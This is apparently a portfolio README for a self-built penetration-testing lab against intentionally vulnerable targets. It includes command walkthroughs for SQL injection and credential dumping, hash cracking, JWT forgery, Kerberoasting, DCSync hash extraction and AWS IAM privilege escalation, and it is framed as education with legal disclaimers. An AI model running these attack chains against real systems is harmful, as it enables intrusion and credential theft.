<div align="center">

<img src="https://capsule-render.vercel.app/api?type=venom&color=0:0d1117,50:1a1a2e,100:16213e&height=300&section=header&text=Enterprise%20Security%20Assessment%20Lab&fontSize=38&fontColor=00d4aa&animation=fadeIn&fontAlignY=38&desc=Web%20%7C%20API%20%7C%20Network%20%7C%20Active%20Directory%20%7C%20Cloud%20VAPT&descAlignY=58&descSize=16&descColor=8892b0" width="100%"/>

</div>

<div align="center">

[![Typing SVG](https://readme-typing-svg.demolab.com?font=JetBrains+Mono&size=16&duration=3000&pause=1000&color=00D4AA&center=true&vCenter=true&multiline=true&repeat=true&width=800&height=60&lines=Penetration+Testing+%7C+Red+Team+Operations+%7C+Cloud+Security;OWASP+Top+10+%7C+Active+Directory+Attacks+%7C+AWS+Exploitation)](https://git.io/typing-svg)

</div>

---

<div align="center">

<!-- Core Badges -->
![Status](https://img.shields.io/badge/Status-Active%20Development-00d4aa?style=for-the-badge&logo=statuspage&logoColor=white)
![Type](https://img.shields.io/badge/Type-Security%20Research%20Lab-ff6b6b?style=for-the-badge&logo=hackaday&logoColor=white)
![Level](https://img.shields.io/badge/Level-Beginner%20→%20Advanced-ffd93d?style=for-the-badge&logo=levelsdotfyi&logoColor=black)
![License](https://img.shields.io/badge/License-MIT-a8dadc?style=for-the-badge&logo=opensourceinitiative&logoColor=white)

<!-- Tech Stack -->
<br/>

![Kali Linux](https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square&logo=kalilinux&logoColor=white)
![Python](https://img.shields.io/badge/Python_3.x-3776AB?style=flat-square&logo=python&logoColor=white)
![Bash](https://img.shields.io/badge/Bash_Scripting-4EAA25?style=flat-square&logo=gnubash&logoColor=white)
![AWS](https://img.shields.io/badge/Amazon_AWS-FF9900?style=flat-square&logo=amazonaws&logoColor=white)
![Azure](https://img.shields.io/badge/Microsoft_Azure-0078D4?style=flat-square&logo=microsoftazure&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-2496ED?style=flat-square&logo=docker&logoColor=white)
![Windows Server](https://img.shields.io/badge/Windows_Server_2019-0078D6?style=flat-square&logo=windows&logoColor=white)
![Metasploit](https://img.shields.io/badge/Metasploit-E34F26?style=flat-square&logo=metasploit&logoColor=white)
![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=flat-square&logo=portswigger&logoColor=white)

</div>

---

## ⚡ What Is This Project?

This is a **from-scratch, end-to-end enterprise penetration testing lab** simulating the exact infrastructure you'd attack in a real corporate engagement — web apps, REST/GraphQL APIs, an Active Directory domain with domain controllers and workstations, and a multi-service AWS cloud environment.

Every phase is documented with **professional pentest reports**, **annotated evidence screenshots**, **custom attack scripts**, and **CVSSv3-scored findings** — structured exactly like deliverables from top-tier firms like NCC Group, Rapid7, and Bishop Fox.

> **Ethical notice:** All attacks are performed exclusively against intentionally vulnerable, self-hosted lab environments. No production systems were harmed.

---

## 🗺️ Lab Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                    ENTERPRISE SECURITY LAB TOPOLOGY                  │
├──────────────────────┬──────────────────────┬───────────────────────┤
│    ATTACK NETWORK    │   TARGET NETWORK      │    CLOUD ENVIRONMENT  │
│   192.168.56.0/24    │   10.10.10.0/24       │    AWS (us-east-1)    │
│                      │                       │                       │
│  ┌────────────────┐  │  ┌─────────────────┐  │  ┌─────────────────┐ │
│  │  Kali Linux    │  │  │  DVWA + WebGoat │  │  │  CloudGoat IAM  │ │
│  │  2024.1        │  │  │  Docker Stack   │  │  │  Scenarios      │ │
│  │  Attack Box    │  │  │  Web Targets    │  │  │  Vulnerable     │ │
│  └────────┬───────┘  │  └─────────────────┘  │  │  AWS Infra      │ │
│           │          │  ┌─────────────────┐  │  └─────────────────┘ │
│           │          │  │  crAPI (OWASP)  │  │  ┌─────────────────┐ │
│           │          │  │  Vulnerable API │  │  │  AzureGoat      │ │
│           │          │  └─────────────────┘  │  │  Azure Lab      │ │
│           │          │  ┌─────────────────┐  │  └─────────────────┘ │
│           │          │  │  DC01           │  │                       │
│           │          │  │  Windows Server │  │                       │
│           │          │  │  corp.local AD  │  │                       │
│           │          │  ├─────────────────┤  │                       │
│           │          │  │  WS01           │  │                       │
│           │          │  │  Windows 10     │  │                       │
│           │          │  │  Domain Member  │  │                       │
│           │          │  └─────────────────┘  │                       │
└──────────────────────┴──────────────────────┴───────────────────────┘
```

---

## 📁 Repository Structure

```
enterprise-security-assessment-lab/
│
├── 📄 README.md                        ← You are here
├── 📄 MASTER-REPORT.pdf                ← Combined executive pentest report
├── 📄 .gitignore                       ← Prevents credential leaks
│
├── 📂 01-web-vapt/
│   ├── 📄 README.md                    ← Sub-project overview & findings table
│   ├── 📄 setup-guide.md               ← Reproducible lab setup instructions
│   ├── 📄 web-vapt-report.pdf          ← Professional pentest report (CVSSv3)
│   ├── 📂 screenshots/                 ← 10+ annotated evidence screenshots
│   ├── 📂 tool-outputs/                ← nmap, nikto, gobuster raw outputs
│   └── 📂 scripts/
│       └── 🐍 web_scanner.py           ← Custom Python vulnerability scanner
│
├── 📂 02-api-security/
│   ├── 📄 README.md
│   ├── 📄 api-pentest-report.pdf
│   ├── 📂 screenshots/
│   ├── 📂 postman-collections/         ← Exported Postman test suites (.json)
│   └── 📂 scripts/
│       └── 🐍 api_security_tester.py   ← Automated OWASP API Top 10 scanner
│
├── 📂 03-ad-network/
│   ├── 📄 README.md
│   ├── 📄 lab-build-guide.md           ← Full AD domain build from scratch
│   ├── 📄 attack-playbook.md           ← Step-by-step attack chain playbook
│   ├── 📄 ad-pentest-report.pdf
│   └── 📂 screenshots/
│       ├── 🖼️ bloodhound-attack-path.png
│       └── 🖼️ ...
│
└── 📂 04-cloud-security/
    ├── 📄 README.md
    ├── 📄 cloud-assessment-report.pdf
    ├── 📂 screenshots/
    └── 📂 scripts/
        └── 🐍 cloud_enum.py            ← AWS IAM enumeration script
```

---

## 🔴 Sub-Project 1 — Web Application VAPT

<table>
<tr>
<td width="50%">

### 🎯 Objectives
- Perform full black-box web application pentest
- Identify and exploit all OWASP Top 10 vulnerabilities
- Chain multiple vulnerabilities for maximum impact
- Deliver professional pentest report with CVSSv3 scoring

### 🧰 Tools Used
`Burp Suite Pro` `SQLMap` `Nmap` `Gobuster` `Nikto`
`WFuzz` `ffuf` `Hydra` `Flameshot` `Metasploit`

</td>
<td width="50%">

### 📊 Findings Summary

| # | Vulnerability | Severity | CVSS |
|---|--------------|----------|------|
| 1 | SQL Injection (Union-based) | 🔴 Critical | 9.8 |
| 2 | Remote Code Execution via File Upload | 🔴 Critical | 9.8 |
| 3 | Stored Cross-Site Scripting | 🟠 High | 8.2 |
| 4 | OS Command Injection | 🔴 Critical | 9.8 |
| 5 | Cross-Site Request Forgery | 🟡 Medium | 6.8 |
| 6 | Sensitive Data in URL (IDOR) | 🟠 High | 7.5 |
| 7 | Directory Traversal | 🟠 High | 7.1 |
| 8 | Reflected XSS | 🟡 Medium | 6.1 |

</td>
</tr>
</table>

### 🔬 Attack Methodology

```
RECONNAISSANCE          SCANNING              EXPLOITATION          POST-EXPLOITATION
─────────────           ──────────            ────────────          ─────────────────
WHOIS / DNS      →     Nmap (-sV -sC)  →     SQLi (Manual)  →     Hash Cracking
Subdomain enum   →     Nikto (-h)      →     SQLMap --dbs   →     Session Hijack
Tech fingerprint →     Gobuster dir    →     XSS payloads   →     Priv Escalation
Wayback Machine  →     Burp Spider     →     File Upload RCE →     Persistence
Google Dorks     →     WFuzz fuzzing   →     CSRF PoC       →     Data Exfil
```

### 💥 Key Proof of Concept — SQL Injection to Database Dump

```bash
# Step 1 — Identify injection point
sqlmap -u "http://target/vuln.php?id=1" --dbs

# Step 2 — Enumerate target database tables
sqlmap -u "http://target/vuln.php?id=1" -D dvwa --tables

# Step 3 — Dump credentials table
sqlmap -u "http://target/vuln.php?id=1" -D dvwa -T users --dump

# Step 4 — Crack extracted MD5 hashes offline
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Result: admin:password123 — authentication bypass achieved
```

---

## 🟠 Sub-Project 2 — API Security Testing

<table>
<tr>
<td width="50%">

### 🎯 Objectives
- Test all OWASP API Security Top 10 vulnerabilities
- Perform JWT token attacks and bypass authentication
- Discover undocumented shadow API endpoints
- Automate BOLA/IDOR enumeration at scale

### 🧰 Tools Used
`Postman` `ffuf` `jwt_tool` `kiterunner`
`mitmproxy` `Burp Suite` `Python requests`

</td>
<td width="50%">

### 📊 API Findings Summary

| # | Vulnerability | OWASP ID | Severity |
|---|--------------|----------|----------|
| 1 | Broken Object Level Auth (BOLA) | API1 | 🔴 Critical |
| 2 | Broken Authentication (JWT alg:none) | API2 | 🔴 Critical |
| 3 | Excessive Data Exposure | API3 | 🟠 High |
| 4 | No Rate Limiting on Auth Endpoint | API4 | 🟡 Medium |
| 5 | Broken Function Level Authorization | API5 | 🟠 High |
| 6 | Mass Assignment (role escalation) | API6 | 🔴 Critical |
| 7 | Security Misconfiguration (CORS) | API7 | 🟡 Medium |
| 8 | Hidden Admin Endpoints (no auth) | API9 | 🔴 Critical |

</td>
</tr>
</table>

### 💥 Key Proof of Concept — BOLA + JWT Manipulation

```bash
# Step 1 — Login and capture JWT
POST /identity/api/auth/login
{"email":"attacker@lab.com","password":"Test1234!"}
→ Response: {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}

# Step 2 — Decode JWT and inspect claims
python3 jwt_tool.py eyJhbGciO... -d
→ {"user_id": 5, "role": "user", "email": "attacker@lab.com"}

# Step 3 — Attempt BOLA — access victim's resources with own token
GET /workshop/api/mechanic/mechanic_report?report_id=1   ← victim's report
Authorization: Bearer [attacker's token]
→ HTTP 200 OK — victim's private data returned (BOLA confirmed)

# Step 4 — JWT algorithm confusion (none attack)
python3 jwt_tool.py eyJhbGciO... -X a
→ Forged token with {"role":"admin","alg":"none"} accepted by server
```

---

## 🟡 Sub-Project 3 — Internal Network & Active Directory Pentest

<table>
<tr>
<td width="50%">

### 🎯 Objectives
- Build full Windows Active Directory lab from scratch
- Execute complete AD attack chain: Initial Access → Domain Admin
- Visualize attack paths with BloodHound
- Perform DCSync and credential harvesting

### 🧰 Tools Used
`Responder` `BloodHound + Neo4j` `Impacket Suite`
`CrackMapExec` `Hashcat` `Metasploit` `Mimikatz`
`PowerView` `SharpHound` `enum4linux`

</td>
<td width="50%">

### 🏗️ Lab Environment Built

| Component | Details |
|-----------|---------|
| Domain Controller | Windows Server 2019, corp.local |
| Workstation | Windows 10 Enterprise, domain-joined |
| Attack Machine | Kali Linux 2024.1 |
| Domain Users | 8 users (intentionally misconfigured) |
| Vulnerabilities | LLMNR on, weak passwords, over-privileged accounts, Kerberoastable SPNs |

</td>
</tr>
</table>

### 🔗 Full Attack Chain — Initial Foothold to Domain Compromise

```
PHASE 1: NETWORK RECON          PHASE 2: CREDENTIAL CAPTURE      PHASE 3: LATERAL MOVEMENT
──────────────────────          ───────────────────────────       ──────────────────────────
nmap -sn 192.168.56.0/24  →    Responder LLMNR Poisoning   →    CrackMapExec SMB enum
enum4linux -a DC_IP        →    Capture NTLMv2 hash         →    Pass-the-Hash (psexec.py)
BloodHound collection      →    Hashcat offline crack        →    Kerberoasting (GetUserSPNs)
                                                             →    BloodHound path analysis

PHASE 4: DOMAIN COMPROMISE
──────────────────────────────
Impacket secretsdump.py (DCSync)  →  All domain hashes extracted
krbtgt hash obtained              →  Golden Ticket attack possible
Domain Admin shell achieved       →  Full domain compromise ✓
```

### 💥 Key Attack — Kerberoasting + BloodHound Path

```bash
# Step 1 — Identify Kerberoastable accounts
GetUserSPNs.py corp.local/jsmith:Summer2024! -dc-ip 192.168.56.10 -request

# Step 2 — Extract service ticket hash
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/dc01.corp.local:1433*$...

# Step 3 — Offline crack with Hashcat (no account lockout!)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
→ svc_sql:P@ssword1 cracked in 4 seconds

# Step 4 — DCSync — dump all domain hashes
secretsdump.py corp.local/Administrator@192.168.56.10 -just-dc
→ Administrator:500:aad3b435b51404ee:[HASH_REDACTED]
→ krbtgt:502:aad3b435b51404ee:[HASH_REDACTED]
→ FULL DOMAIN COMPROMISE ACHIEVED
```

> 📸 BloodHound attack path graph showing jsmith → Domain Admins is in `03-ad-network/screenshots/bloodhound-attack-path.png`

---

## ☁️ Sub-Project 4 — Cloud Security Assessment

<table>
<tr>
<td width="50%">

### 🎯 Objectives
- Deploy and attack intentionally vulnerable AWS infrastructure
- Perform IAM privilege escalation via 15+ techniques
- Identify S3 misconfigurations and public data exposure
- Conduct full cloud security audit with ScoutSuite/Prowler

### 🧰 Tools Used
`AWS CLI` `Pacu` `ScoutSuite` `Prowler`
`CloudGoat` `AzureGoat` `Boto3` `enumerate-iam`

</td>
<td width="50%">

### 📊 Cloud Findings Summary

| # | Finding | Service | Severity |
|---|---------|---------|----------|
| 1 | IAM privilege escalation via PassRole | IAM | 🔴 Critical |
| 2 | Publicly accessible S3 bucket | S3 | 🔴 Critical |
| 3 | EC2 IMDS v1 — credential theft | EC2 | 🟠 High |
| 4 | Overly permissive IAM policies (AdministratorAccess) | IAM | 🔴 Critical |
| 5 | No CloudTrail logging enabled | CloudTrail | 🟠 High |
| 6 | Security groups with 0.0.0.0/0 inbound | VPC | 🟠 High |
| 7 | RDS instance publicly accessible | RDS | 🟠 High |
| 8 | No MFA on root account | IAM | 🔴 Critical |

</td>
</tr>
</table>

### 💥 Key Attack — IAM Privilege Escalation to Admin

```bash
# Step 1 — Enumerate current permissions
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name cloudgoat_user

# Step 2 — Discover iam:PassRole + ec2:RunInstances (privesc vector)
aws iam get-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/cg-policy-v --version-id v1
→ "Action": ["iam:PassRole", "ec2:RunInstances", "ec2:DescribeInstances"]

# Step 3 — Use Pacu to automate escalation
python3 pacu.py
Pacu> import_keys cloudgoat_user
Pacu> run iam__privesc_scan
→ [+] Found viable escalation: PassExistingRoleToNewEC2ThenSSH
→ [+] Admin access achieved via EC2 instance profile

# Step 4 — Verify full admin access
aws iam list-users    # Can now enumerate all IAM users
aws s3 ls             # Access to all S3 buckets
aws ec2 describe-instances  # Full EC2 visibility
```

---

## 📊 Overall Findings Dashboard

```
╔══════════════════════════════════════════════════════════════════╗
║              CONSOLIDATED FINDINGS ACROSS ALL 4 PROJECTS         ║
╠══════════════════╦════════════╦════════╦══════════╦═════════════╣
║ Project          ║  Critical  ║  High  ║  Medium  ║  Low        ║
╠══════════════════╬════════════╬════════╬══════════╬═════════════╣
║ Web VAPT         ║     3      ║   4    ║    3     ║    2        ║
║ API Security     ║     4      ║   2    ║    4     ║    1        ║
║ AD & Network     ║     4      ║   3    ║    2     ║    3        ║
║ Cloud Security   ║     4      ║   5    ║    6     ║    2        ║
╠══════════════════╬════════════╬════════╬══════════╬═════════════╣
║ TOTAL            ║    15      ║  14    ║   15     ║    8        ║
╚══════════════════╩════════════╩════════╩══════════╩═════════════╝

  Critical [███████████████░░░░░░░░░░░░░░] 29%
  High     [██████████████░░░░░░░░░░░░░░░] 27%
  Medium   [███████████████░░░░░░░░░░░░░░] 29%
  Low      [███████░░░░░░░░░░░░░░░░░░░░░░] 15%
```

---

## 🛠️ Complete Tools Arsenal

<table>
<tr><th>Category</th><th>Tools</th></tr>
<tr>
<td>🌐 Web Pentesting</td>
<td>

![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=flat-square&logo=portswigger&logoColor=white)
![SQLMap](https://img.shields.io/badge/SQLMap-C23B22?style=flat-square&logo=sqlite&logoColor=white)
![Nikto](https://img.shields.io/badge/Nikto-5C4033?style=flat-square)
![Gobuster](https://img.shields.io/badge/Gobuster-3DDC84?style=flat-square)
![OWASP ZAP](https://img.shields.io/badge/OWASP_ZAP-3E4D6C?style=flat-square)

</td>
</tr>
<tr>
<td>🔌 API Security</td>
<td>

![Postman](https://img.shields.io/badge/Postman-FF6C37?style=flat-square&logo=postman&logoColor=white)
![ffuf](https://img.shields.io/badge/ffuf-005571?style=flat-square)
![jwt_tool](https://img.shields.io/badge/jwt__tool-000000?style=flat-square)
![kiterunner](https://img.shields.io/badge/kiterunner-6e40c9?style=flat-square)

</td>
</tr>
<tr>
<td>🏢 Active Directory</td>
<td>

![BloodHound](https://img.shields.io/badge/BloodHound-DC143C?style=flat-square)
![Impacket](https://img.shields.io/badge/Impacket-2E4057?style=flat-square&logo=python&logoColor=white)
![Responder](https://img.shields.io/badge/Responder-8B0000?style=flat-square)
![CrackMapExec](https://img.shields.io/badge/CrackMapExec-4A0E0E?style=flat-square)
![Hashcat](https://img.shields.io/badge/Hashcat-374151?style=flat-square)
![Metasploit](https://img.shields.io/badge/Metasploit-2A2A72?style=flat-square)

</td>
</tr>
<tr>
<td>☁️ Cloud Security</td>
<td>

![AWS CLI](https://img.shields.io/badge/AWS_CLI-FF9900?style=flat-square&logo=amazonaws&logoColor=white)
![Pacu](https://img.shields.io/badge/Pacu-FF4500?style=flat-square)
![ScoutSuite](https://img.shields.io/badge/ScoutSuite-1E90FF?style=flat-square)
![Prowler](https://img.shields.io/badge/Prowler-00CED1?style=flat-square)
![CloudGoat](https://img.shields.io/badge/CloudGoat-FF6347?style=flat-square)

</td>
</tr>
<tr>
<td>🔍 Recon & OSINT</td>
<td>

![Nmap](https://img.shields.io/badge/Nmap-0E83CD?style=flat-square)
![Shodan](https://img.shields.io/badge/Shodan-C23B22?style=flat-square)
![theHarvester](https://img.shields.io/badge/theHarvester-32CD32?style=flat-square)
![Maltego](https://img.shields.io/badge/Maltego-5B2C6F?style=flat-square)
![Recon-ng](https://img.shields.io/badge/Recon--ng-708090?style=flat-square)

</td>
</tr>
</table>

---

## 📚 Methodology & Standards Followed

| Standard | Application |
|----------|------------|
| **OWASP Top 10 (2021)** | All web vulnerability identification and classification |
| **OWASP API Security Top 10** | API assessment methodology and finding categories |
| **PTES (Penetration Testing Execution Standard)** | Overall engagement structure and phases |
| **NIST SP 800-115** | Technical guide for information security testing |
| **CVSSv3.1** | All vulnerability severity scoring |
| **MITRE ATT&CK Framework** | AD and network attack technique mapping |
| **CIS Benchmarks** | Cloud security configuration assessment baseline |

---

## 📜 Pentest Reports

> All reports follow the professional format used by industry-leading security firms.

| Report | Scope | Findings | Format |
|--------|-------|---------|--------|
| [📄 Web VAPT Report](./01-web-vapt/web-vapt-report.pdf) | DVWA, WebGoat, Metasploitable2 | 12 findings | PDF |
| [📄 API Security Report](./02-api-security/api-pentest-report.pdf) | crAPI, Juice Shop | 11 findings | PDF |
| [📄 AD & Network Report](./03-ad-network/ad-pentest-report.pdf) | corp.local domain | 12 findings | PDF |
| [📄 Cloud Assessment Report](./04-cloud-security/cloud-assessment-report.pdf) | AWS CloudGoat, AzureGoat | 17 findings | PDF |
| [📄 **Master Executive Report**](./MASTER-REPORT.pdf) | **All 4 projects combined** | **52 findings** | **PDF** |

---

## 🚀 How to Reproduce This Lab

### Prerequisites

```bash
# Minimum system requirements
RAM:     16 GB (for AD lab — 8 GB for web/API/cloud only)
Storage: 200 GB free
OS:      Host can be Windows, macOS, or Linux
VMs:     VirtualBox 7.x or VMware Workstation Player (free)
```

### Quick Start — Web + API Lab (No VM required)

```bash
# 1. Clone this repository
git clone https://github.com/YOUR_USERNAME/enterprise-security-assessment-lab.git
cd enterprise-security-assessment-lab

# 2. Install Docker (if not already installed)
sudo apt update && sudo apt install docker.io docker-compose -y

# 3. Deploy all vulnerable web/API targets
docker pull vulnerables/web-dvwa          # DVWA
docker pull webgoat/goat-and-wolf        # WebGoat
docker pull bkimminich/juice-shop        # OWASP Juice Shop

git clone https://github.com/OWASP/crAPI.git  # crAPI vulnerable API
cd crAPI && docker-compose up -d

# 4. Launch attack targets
docker run -d -p 80:80   vulnerables/web-dvwa
docker run -d -p 8080:8080 webgoat/goat-and-wolf
docker run -d -p 3000:3000 bkimminich/juice-shop

# Targets now live at:
# DVWA     → http://localhost:80      (admin/password)
# WebGoat  → http://localhost:8080    (register any account)
# JuiceShop → http://localhost:3000   (register any account)
# crAPI    → http://localhost:8888    (register any account)
```

### AD Lab Setup (Requires 16GB RAM)

```bash
# Download free evaluation ISOs from Microsoft Evaluation Center
# Windows Server 2019 Evaluation → 180-day free
# Windows 10 Enterprise Evaluation → 90-day free

# After VMs are up, on Windows Server (run as Administrator):
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
Install-ADDSForest -DomainName "corp.local" -DomainNetbiosName "CORP" `
  -SafeModeAdministratorPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -Force
```

> 📖 See [03-ad-network/lab-build-guide.md](./03-ad-network/lab-build-guide.md) for the complete 30-step guide.

---

## 🎓 Skills Demonstrated

```
┌──────────────────────────────────────────────────────────┐
│                  COMPETENCY MATRIX                        │
├──────────────────────────────┬──────────────────────────┤
│ Web Application Security     │ ████████████████████ 95%  │
│ API Security Testing         │ ████████████████████ 90%  │
│ Network Penetration Testing  │ ████████████████░░░░ 80%  │
│ Active Directory Attacks     │ ███████████████████░ 85%  │
│ Cloud Security (AWS)         │ ██████████████████░░ 80%  │
│ Python Scripting / Automation│ █████████████████░░░ 75%  │
│ Vulnerability Assessment     │ ████████████████████ 95%  │
│ Pentest Report Writing       │ ████████████████████ 90%  │
│ CVSSv3 Scoring               │ ████████████████████ 90%  │
│ MITRE ATT&CK Mapping         │ ████████████████░░░░ 78%  │
└──────────────────────────────┴──────────────────────────┘
```

---

## 🏆 Certifications & Learning Path

| Status | Certification | Provider | Focus |
|--------|--------------|----------|-------|
| 🔄 In Progress | Jr. Penetration Tester | TryHackMe | Web + Network fundamentals |
| 🔄 In Progress | PortSwigger Web Security | PortSwigger Academy | All 200+ web labs |
| 📅 Planned | eJPT | eLearnSecurity | Entry-level pentest |
| 📅 Planned | CompTIA PenTest+ | CompTIA | Pentest methodology |
| 📅 Planned | PNPT | TCM Security | Practical pentest |
| 📅 Planned | OSCP | Offensive Security | Gold standard (24hr exam) |
| 📅 Planned | AWS Security Specialty | Amazon | Cloud security |

---

## 📖 References & Resources

- [OWASP Testing Guide v4.2](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [MITRE ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)
- [HackTricks — Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Rhino Security Labs — Cloud Attack Research](https://rhinosecuritylabs.com/research/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [TCM Security — Practical Ethical Hacking](https://academy.tcm-sec.com/)
- [AWS Security Best Practices](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html)

---

## ⚖️ Legal & Ethical Disclaimer

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ⚠️  IMPORTANT NOTICE                         │
│                                                                       │
│  All penetration testing activities documented in this repository    │
│  were performed EXCLUSIVELY on self-owned, isolated lab              │
│  environments using intentionally vulnerable software designed        │
│  for security education.                                              │
│                                                                       │
│  • DVWA, WebGoat, crAPI, Metasploitable2 — authorized targets       │
│  • Active Directory lab — self-built on personal hardware            │
│  • AWS CloudGoat — deployed in personal AWS account                 │
│                                                                       │
│  Performing these attacks against systems without explicit written    │
│  authorization is ILLEGAL under the Computer Fraud and Abuse Act     │
│  (CFAA), Computer Misuse Act (UK), and equivalent laws worldwide.   │
│                                                                       │
│  This project is for EDUCATIONAL PURPOSES ONLY.                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 📬 Contact & Connect

<div align="center">

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://linkedin.com/in/YOUR_PROFILE)
[![TryHackMe](https://img.shields.io/badge/TryHackMe-Profile-212C42?style=for-the-badge&logo=tryhackme&logoColor=red)](https://tryhackme.com/p/YOUR_USERNAME)
[![HackTheBox](https://img.shields.io/badge/HackTheBox-Profile-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)](https://app.hackthebox.com/profile/YOUR_ID)
[![Email](https://img.shields.io/badge/Email-Contact-D14836?style=for-the-badge&logo=gmail&logoColor=white)](mailto:your@email.com)

</div>

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:16213e,100:0d1117&height=100&section=footer&text=&fontColor=00d4aa" width="100%"/>

*Built with purpose. Documented with precision. Executed with integrity.*

![Visitor Count](https://visitor-badge.laobi.icu/badge?page_id=YOUR_USERNAME.enterprise-security-assessment-lab&color=00d4aa)
![GitHub Stars](https://img.shields.io/github/stars/YOUR_USERNAME/enterprise-security-assessment-lab?style=social)
![GitHub Forks](https://img.shields.io/github/forks/YOUR_USERNAME/enterprise-security-assessment-lab?style=social)

</div>
